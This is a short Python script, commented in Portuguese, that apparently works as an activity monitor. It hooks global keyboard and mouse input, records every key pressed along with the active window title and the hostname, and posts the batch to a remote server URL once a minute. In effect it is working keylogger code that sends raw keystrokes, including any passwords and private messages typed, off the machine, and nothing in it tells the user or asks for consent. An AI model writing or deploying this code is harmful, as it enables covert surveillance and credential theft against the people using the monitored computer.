import time
import json
import requests
from pynput import keyboard, mouse
import socket
import pygetwindow as gw
from datetime import datetime
from threading import Thread
from dotenv import load_dotenv
import os
import ctypes

# Carrega variáveis do .env
load_dotenv()
SERVER_URL = os.getenv("SERVER_URL")
AUTH_HASH = os.getenv("AUTH_HASH")

# Variáveis globais
mouse_clicks = 0
keys_pressed = []
LOG_FILE = "activity_log.txt"

def log_local(info):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} - {info}\n")

def is_pc_locked():
    """Retorna True se o PC estiver bloqueado (lock screen ativa)"""
    user32 = ctypes.windll.User32
    return not user32.GetForegroundWindow()

def on_click(x, y, button, pressed):
    global mouse_clicks
    if pressed:
        mouse_clicks += 1

def on_press(key):
    global keys_pressed
    try:
        k = key.char
    except:
        k = str(key)
    keys_pressed.append(k)

def get_active_window():
    try:
        return gw.getActiveWindow().title
    except:
        return "Unknown"

def send_data():
    global mouse_clicks, keys_pressed
    while True:
        if is_pc_locked():
            log_local("PC está bloqueado. Dados não enviados.")
            print("PC bloqueado, pulando envio...")
            time.sleep(60)
            continue

        now = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
        data = {
            "timestamp": now,
            "hostname": socket.gethostname(),
            "window_title": get_active_window(),
            "mouse_clicks": mouse_clicks,
            "keys_pressed": keys_pressed
        }

        try:
            res = requests.post(SERVER_URL, headers={
                "Content-Type": "application/json",
                "x-auth-hash": AUTH_HASH
            }, data=json.dumps(data))

            status_info = f"Enviado: {res.status_code} | Resp: {res.text}"
            print(f"[{now}] {status_info}")
            log_local(status_info)

        except Exception as e:
            error_info = f"Erro: {e}"
            print(error_info)
            log_local(error_info)

        # Reset para próximo minuto
        mouse_clicks = 0
        keys_pressed = []
        time.sleep(60)

# Inicia listeners e envio
Thread(target=send_data).start()
keyboard.Listener(on_press=on_press).start()
mouse.Listener(on_click=on_click).start()
